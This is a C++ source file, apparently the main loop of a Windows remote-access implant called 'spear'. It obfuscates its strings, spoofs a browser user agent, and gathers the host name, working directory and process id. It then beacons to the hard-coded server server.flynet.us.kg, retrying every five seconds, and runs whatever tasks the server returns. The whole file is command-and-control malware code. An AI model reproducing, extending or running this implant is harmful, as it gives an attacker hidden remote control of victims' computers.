#include <cwchar>
#include <string>
#include <unistd.h>
#include <windows.h>
#include <nlohmann/json.hpp>

#include "API.h"
#include "Tasks.h"
#include "Utilt.h"
#include "KeyWord.h"
#include "DebugLog.h"
#include "Instance.h"
#include "Obfuscation.h"
#include "Transportion.h"
_Instance Instance;

bool Register()
{
    DEBUG_LOG("Try to connect: ");
    nlohmann::json respone = spear::Transporter::GetInstance().HttpGet(uri.Regi);
    if (respone.is_null())
    {
        DEBUG_LOG("Failed to connect: ");
        Instance.Config.connected = false;
        return false;
    }
    Instance.Info.uuid = spear::ToWstring(respone.at("UUID").get<std::string>());
    Instance.Config.connected = true;
    return true;
}

int main(void)
{   
    DWORD nameSize = 0;
    Win32::GetComputerNameW(NULL, &nameSize);
    const wchar_t* computerName = new wchar_t[nameSize];
    Win32::GetComputerNameW((LPWSTR)computerName, &nameSize);
    Instance.Config.exit           = false;
    Instance.Config.userAgent      = std::wstring(WOBF(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0"));
    Instance.Config.Address.server = std::wstring(WOBF(L"server.flynet.us.kg"));
    Instance.Config.Address.port   = INTERNET_DEFAULT_HTTPS_PORT;
    Instance.Info.hostName         = std::wstring(computerName);
    Instance.Info.os               = std::wstring(WOBF(L"Windows 11"));
    Instance.Info.cwd              = std::wstring(spear::ToWstring(std::string(getcwd(NULL, 0))));
    Instance.Info.pid              = Win32::GetCurrentProcessId();

    while (!Instance.Config.exit)
    {
        if (!Register())
        {
            // * Wait 5 seconds to reconnect
            Sleep(5000); 
            continue;
        }
        spear::TaskEngine();
    }
    return 0;
}
